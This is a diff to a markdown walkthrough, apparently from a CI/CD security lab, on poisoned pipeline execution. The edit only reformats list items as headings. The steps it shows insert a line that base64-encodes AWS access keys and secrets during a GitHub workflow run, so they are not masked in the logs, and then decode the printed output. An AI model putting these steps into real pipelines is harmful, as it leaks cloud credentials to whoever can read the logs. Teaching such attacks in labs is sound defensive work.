@@ -13,13 +13,13 @@
 
 ## Execute Direct-PPE 
 
-1.  Add line of code to extract `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` during Pipeline execution after `make build`
+### Add line of code to extract `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` during Pipeline execution after `make build`
 
 ```
 echo "accesskey: ${{ env.AWS_ACCESS_KEY_ID }}  secretkey: ${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64
 ```
 
-1. Extract Output from GitHub Workflow Output and 
+### Extract Output from GitHub Workflow Output and 
 
 ```
 echo "<ENCODED_SECRETS>" | base64 -d
